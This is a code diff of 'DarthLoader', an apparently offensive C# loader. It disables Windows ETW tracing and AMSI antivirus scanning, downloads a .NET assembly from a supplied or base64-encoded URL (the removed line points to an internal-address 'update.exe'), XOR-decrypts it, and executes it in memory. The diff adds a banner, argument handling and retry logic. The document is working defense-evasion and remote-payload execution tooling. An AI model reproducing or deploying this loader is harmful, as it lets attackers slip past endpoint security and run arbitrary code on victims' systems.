@@ -3,17 +3,18 @@ using System.Reflection;
 using System;
 using System.Threading;
 
-
 namespace DarthLoader
 {
     class Program
     {
         // download a .Net assembly and xor encrypt the bytes
-        static byte[] PrepareRemoteAssembly(string url, int count, string xorKey = "")
+        static byte[] PrepareRemoteAssembly(string url, string xorKey = "")
         {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             WebClient webClient = new WebClient();
             byte[] programBytes = null;
+            int count = 3;
+
             while (count >= 0 && programBytes == null)
             {
                 try
@@ -25,7 +26,7 @@ namespace DarthLoader
                     Console.WriteLine("[!] Assembly not found!");
                     Console.WriteLine($"[+] Retrying download...");
                     count--;
-                    Thread.Sleep(1000);
+                    Thread.Sleep(2000);
                 }
             }
             return programBytes;
@@ -44,29 +45,51 @@ namespace DarthLoader
             {
                 Console.WriteLine("[!] Missing arguments for loaded assembly!");
                 Environment.Exit(-1);
-            }            
+            }
         }
 
         static void Main(string[] args)
         {
+            string banner = @"
+(                            (                                 
+ )\ )                 )    )  )\ )              (               
+(()/(      )  (    ( /( ( /( (()/(          )   )\ )   (   (    
+ /(_))  ( /(  )(   )\()))\()) /(_))  (   ( /(  (()/(  ))\  )(   
+(_))_   )(_))(()\ (_))/((_)\ (_))    )\  )(_))  ((_))/((_)(()\  
+|   \ ((_)_  ((_)| |_ | |(_)| |    ((_)((_)_   _| |(_))   ((_) 
+| |) |/ _` || '_||  _|| ' \ | |__ / _ \/ _` |/ _` |/ -_) | '_| 
+|___/ \__,_||_|   \__||_||_||____|\___/\__,_|\__,_|\___| |_| 
+                ";
+
+            Console.WriteLine(banner);
+
             try
             {
                 string key = args[0];
-                string retryCount = args[1];
+                string url = args[1];
 
                 Utilities.BypassETW();
                 Utilities.BypassAMSI();
 
                 Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {key}");
-                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode("aHR0cDovLzEwLjEwLjEuNDAvdXBkYXRlLmV4ZQ=="), Int32.Parse(retryCount), key);
-                Console.WriteLine("[!] .Net assembly downloaded!");
+                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode(url), key);
 
-                Console.WriteLine("[*] Decrypting and executing assembly...");
-                ExecuteAssembly(Utilities.Xor(programBytes, key));
+                if (programBytes == null)
+                {
+                    Console.WriteLine("[!] Assembly was not loaded. Exiting...");
+                    Environment.Exit(-1);
+                } else
+                {
+                    Console.WriteLine("[!] .Net assembly downloaded!");
+
+                    Console.WriteLine("[*] Decrypting and executing assembly...");
+                    ExecuteAssembly(Utilities.Xor(programBytes, key));
+
+                }
             }
-            catch (IndexOutOfRangeException)
+            catch(IndexOutOfRangeException)
             {
-                Console.WriteLine("[!] Missing argument Xor key or retry counter!");
+                Console.WriteLine("[!] Missing argument Xor key!");
                 Environment.Exit(-1);
             }
         }
